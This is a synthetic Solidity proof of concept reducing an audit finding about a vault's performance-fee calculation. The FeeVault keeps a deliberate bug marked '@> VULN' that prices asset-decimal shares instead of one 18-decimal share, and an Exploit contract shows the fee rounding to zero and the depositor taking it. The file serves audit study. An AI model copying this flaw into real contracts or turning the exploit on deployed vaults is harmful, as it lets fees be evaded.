// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Vaultcraft _accruedPerformanceFee — convertToAssets is called with the
    asset decimals (Zokyo, finding 45889).
    SYNTHETIC, cheatcode-free reduction.
    Root cause: the fee prices 10**asset.decimals() shares (1e6 for USDC)
    instead of one 18-decimal share. That unit rounds to 0 assets and sits
    under the high-water mark, so the 100 USDC performance fee is not taken
    and the depositor redeems it.
    The blamed call is preserved (@> VULN). */

contract MockERC20 {
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Sink {}

contract FeeVault {
    MockERC20 public asset;
    uint256 public totalAssets;
    uint256 public totalSupply;
    uint256 public highWaterMark;
    uint256 public constant PERF_BPS = 1000;
    address public feeRecipient;
    bool public immutable shareUnit;
    uint256 public constant ASSETS = 2_000_000_000;
    uint256 public constant SHARES = 1000 ether;

    constructor(MockERC20 a, address feeTo, bool shareUnit_) {
        asset = a;
        feeRecipient = feeTo;
        shareUnit = shareUnit_;
        totalAssets = ASSETS;
        totalSupply = SHARES;
        highWaterMark = 1_000_000;
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        return shares * totalAssets / totalSupply;
    }

    function _accruedPerformanceFee() public view returns (uint256) {
        uint256 shareValue;
        if (!shareUnit) {
            // @> VULN: 10**asset.decimals() shares are priced, not one 18-decimal share
            shareValue = convertToAssets(10 ** uint256(asset.decimals()));
        } else {
            shareValue = convertToAssets(10 ** uint256(18));
        }
        if (shareValue <= highWaterMark) return 0;
        uint256 profit = shareValue - highWaterMark;
        uint256 unit = shareUnit ? uint256(1e18) : 10 ** uint256(asset.decimals());
        return profit * totalSupply / unit * PERF_BPS / 10_000;
    }

    function takeFee() external returns (uint256 fee) {
        fee = _accruedPerformanceFee();
        if (fee != 0) {
            totalAssets -= fee;
            asset.transfer(feeRecipient, fee);
        }
    }

    function redeem(address to) external returns (uint256 assetsOut) {
        assetsOut = totalAssets;
        totalAssets = 0;
        asset.transfer(to, assetsOut);
    }
}

contract Exploit {
    uint256 public constant FAIR_FEE = 100_000_000;

    MockERC20 public asset; // nonce 1
    Sink public feeTo; // nonce 2
    FeeVault public vault; // nonce 3
    Sink public controlFee; // nonce 4
    Sink public controlDepositor; // nonce 5
    FeeVault public control; // nonce 6

    uint256 public feeTaken;
    uint256 public redeemed;
    uint256 public controlFeePaid;
    uint256 public controlRedeemed;

    constructor() {
        asset = new MockERC20();
        feeTo = new Sink();
        vault = new FeeVault(asset, address(feeTo), false);
        controlFee = new Sink();
        controlDepositor = new Sink();
        control = new FeeVault(asset, address(controlFee), true);
        asset.mint(address(vault), 2_000_000_000);
        asset.mint(address(control), 2_000_000_000);
    }

    function run() external {
        feeTaken = vault.takeFee();
        require(feeTaken == 0, "buggy fee was not zero");
        redeemed = vault.redeem(address(this));
        require(redeemed == 2_000_000_000, "depositor did not take the unpaid fee");
        require(asset.balanceOf(address(feeTo)) == 0, "fee recipient was paid");

        controlFeePaid = control.takeFee();
        require(controlFeePaid == FAIR_FEE, "control fee was not 100 USDC");
        controlRedeemed = control.redeem(address(controlDepositor));
        require(controlRedeemed == 2_000_000_000 - FAIR_FEE, "control depositor share");
        require(asset.balanceOf(address(controlFee)) == FAIR_FEE, "fee sink");
    }
}
